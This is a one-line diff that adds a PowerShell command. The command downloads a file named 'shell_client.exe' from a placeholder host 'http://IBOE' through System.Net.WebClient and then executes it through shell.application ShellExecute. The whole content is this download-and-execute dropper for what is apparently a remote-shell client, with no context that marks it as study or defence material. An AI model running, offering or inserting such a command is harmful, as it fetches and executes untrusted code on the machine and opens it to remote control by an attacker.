@@ -1,0 +1,1 @@
+\$down = New-Object System.Net.WebClient; \$url  = 'http://IBOE'; \$file = 'shell_client.exe'; \$down.DownloadFile(\$url,\$file); \$exec = New-Object -com shell.application; \$exec.shellexecute(\$file);
